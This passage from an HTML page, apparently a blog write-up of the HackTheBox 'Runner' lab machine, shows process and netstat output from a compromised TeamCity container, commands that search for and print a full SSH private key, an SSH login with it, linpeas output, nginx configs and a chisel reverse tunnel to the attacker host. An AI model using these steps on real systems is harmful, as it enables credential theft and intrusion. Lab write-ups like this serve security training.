ver/maven-core-3.8.6.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/maven-shared-utils-3.3.4.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/maven-model-builder-3.8.6.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/maven-embedder3.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/maven-embedder-api.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/maven-settings-3.8.6.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/plexus-classworlds-2.6.0.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/plexus-component-annotations-2.1.0.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/maven-resolver-provider-3.8.6.jar:/opt/teamcity/webapps/ROOT/WEB-INF/lib/log4j-1.2-api-2.17.2.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/slf4j-api-1.7.36.jar:/opt/teamcity/webapps/ROOT/WEB-INF/lib/log4j-api-2.17.2.jar:/opt/teamcity/webapps/ROOT/WEB-INF/lib/log4j-core-2.17.2.jar:/opt/teamcity/webapps/ROOT/WEB-INF/lib/common-api.jar:/opt/teamcity/webapps/ROOT/WEB-INF/lib/openapi.jar -Dlogs.dir=/opt/teamcity/logs -Xmx1G jetbrains.buildServer.maven.remote.MavenServerImpl teamcity-mavenServer</code></pre>
+</div>
+</details>
+
+<details>
+<summary>netstat</summary>
+<div class="inner">
+<pre><code>    Proto  Local address     Remote address    State        User  Inode  PID/Program name
+    -----  -------------     --------------    -----        ----  -----  ----------------
+    tcp    0.0.0.0:35785     0.0.0.0:*         LISTEN       1000  0
+    tcp    127.0.0.1:56918   0.0.0.0:*         LISTEN       1000  0
+    tcp    0.0.0.0:8111      0.0.0.0:*         LISTEN       1000  0
+    tcp    127.0.0.1:8105    0.0.0.0:*         LISTEN       1000  0
+    tcp    172.17.0.2:8111   172.17.0.1:59584  CLOSE_WAIT   1000  0
+    tcp    172.17.0.2:8111   172.17.0.1:33390  CLOSE_WAIT   1000  0
+    tcp    172.17.0.2:44924  10.10.14.2:4242   ESTABLISHED  1000  0
+    tcp    172.17.0.2:51296  10.10.14.2:4242   CLOSE_WAIT   1000  0
+    tcp    172.17.0.2:45198  10.10.16.6:4444   ESTABLISHED  1000  0
+    tcp    :::5005           :::*              LISTEN       1000  0</code></pre>
+</div>
+</details>
+
+<p><strong>Found a public ssh key on Teamcity:</strong></p>
+
+<pre><code>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCWTatGGbtPZ2DbPf5jqKhI5WzO82UDjBFLi3LyqsYxIKmdnIQhI+WG0calO7SgYjXUVO6fsfNCPs6t7tgwL5KwwiVLvwwZTaiBvROnZs5jlE3X9f0yIr9ITiWJOeOE9TUWoEh7GZcqWBL+O/ntZS1zkKyBNQZiSlpfpxPaB6I2ocucHlAP5kolYF+UXo/2tO3OQR1xZgq0OnQ+Fy7UVRV5Ak6lvXfD8vQYaLJrZGRmCsjBdHqXdgJf6YFEV+FEUcuZ3+WDL9HYZCkFZQMH2tRL6a0embhzfvzqDXUg9mj7vgjsGE6fUjPYTko7S1baN5/KVjYytiA6OOrl+PQXPd6iPiHG1nK5/QZHwKrUCSjAnIM/TZfMi9VkoIwOBU0AwfkHsI5NfwKNTNzS+4pXmItKL69HHq9hClC/jCWHUfiFSWBpVKKagCqLMk9SrICL2hSEdcZjvXHmAJRd5QtkkxwNgoFnbPN7Hf6I8FiL21OycIhJci9MNvfZ+abWpGYhHJc= # Public key from "id_rsa" in project "All-Projects"</code></pre>
+
+<p><strong>Found a private key on the system:</strong></p>
+
+<pre><code>cd /; fgrep -rn 'BEGIN OPENSSH'
+find / -name id_rsa 2&gt; /dev/null
+/data/teamcity_server/datadir/config/projects/AllProjects/pluginData/ssh_keys/id_rsa</code></pre>
+
+<details>
+<summary>key</summary>
+<div class="inner">
+<pre><code>-----BEGIN OPENSSH PRIVATE KEY-----
+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
+KgK8c9z2ecgZsAAAALam9obkBydW5uZXI=
+-----END OPENSSH PRIVATE KEY-----</code></pre>
+</div>
+</details>
+
+<p><strong>Access as user john:</strong></p>
+
+<pre><code>ssh john@10.10.11.13 -i id_rsa
+
+john@runner:~$ id
+uid=1001(john) gid=1001(john) groups=1001(john)</code></pre>
+
+<h2>Priv escalation</h2>
+
+<h3>linpeas</h3>
+
+<details>
+<summary>Local ports</summary>
+<div class="inner">
+<pre><code>tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:5005          0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:8111          0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:9443          0.0.0.0:*               LISTEN      -
+tcp6       0      0 :::80                   :::*                    LISTEN      -
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+tcp6       0      0 :::8000                 :::*                    LISTEN      - </code></pre>
+</div>
+</details>
+
+<details>
+<summary>Interesting Nginx configuration (all permissions set)</summary>
+<div class="inner">
+<pre><code>drwxr-xr-x 2 root root 4096 Apr  4 10:24 /etc/nginx/sites-enabled
+drwxr-xr-x 2 root root 4096 Apr  4 10:24 /etc/nginx/sites-enabled
+lrwxrwxrwx 1 root root 36 Feb 28 20:31 /etc/nginx/sites-enabled/portainer -&gt; /etc/nginx/sites-available/portainer
+server {
+    listen 80;
+    server_name portainer-administration.runner.htb;
+    location / {
+        proxy_pass https://localhost:9443;
+        proxy_http_version 1.1;
+        proxy_set_header Upgrade $http_upgrade;
+        proxy_set_header Connection 'upgrade';
+        proxy_set_header Host $host;
+        proxy_cache_bypass $http_upgrade;
+    }
+}
+lrwxrwxrwx 1 root root 34 Feb 28 10:07 /etc/nginx/sites-enabled/default -&gt; /etc/nginx/sites-available/default
+server {
+        listen 80 default_server;
+        listen [::]:80 default_server;
+        root /var/www/html;
+        index index.html index.htm index.nginx-debian.html;
+        server_name runner.htb;
+        location / {
+                try_files $uri $uri/ =404;
+        }
+        if ($host != runner.htb) {
+                rewrite ^ http://runner.htb/;
+        }
+}
+lrwxrwxrwx 1 root root 35 Feb 28 10:11 /etc/nginx/sites-enabled/teamcity -&gt; /etc/nginx/sites-available/teamcity
+server {
+    listen 80;
+    server_name teamcity.runner.htb;
+    location / {
+        proxy_pass http://localhost:8111;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto $scheme;
+        proxy_buffering off;
+        proxy_request_buffering off;
+        proxy_http_version 1.1;
+        proxy_intercept_errors on;
+    }
+}
+</code></pre>
+</div>
+</details>
+
+<h3>Reverse portfwd</h3>
+
+<p>Using chisel to check some of the open ports, especially port 9443 seems interesting. because of the Nginx files with incorrect permissions.</p>
+
+<pre><code># On kali
+./chisel_arm server -p 2222 --reverse
+
+# On victim
+./chisel_64 client 10.10.16.6:2222 R:9443:127.0.0.1:9443</code></pre>
+
+
+
+
+                </article>
+
+                <aside class="toc">
+                    <p class="toc-k">Contents</p>
+                    <ul id="toc-list"></ul>
+                </aside>
+            </div>
+        </main>
+
+        <footer class="site-foot">
+            <div class="foot-in">
+                <p class="copy">© <span data-year></span> Frédéric Goossens · <span class="credit">vibe coded</span></p>
+                <div class="socials">
+                    <a class="slink" href="https://github.com/fredericgoossens" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg><span>GitHub</span></a>
+                    <a class="slink" href="https://www.linkedin.com/in/fr%C3%A9d%C3%A9ric-goossens-0344b1241/" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg><span>LinkedIn</span></a>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <div class="scroll-hint" data-scroll-hint aria-hidden="true"></div>
+    <script src="../assets/js/site.js?v=66"></script>
+</body>
+</html>
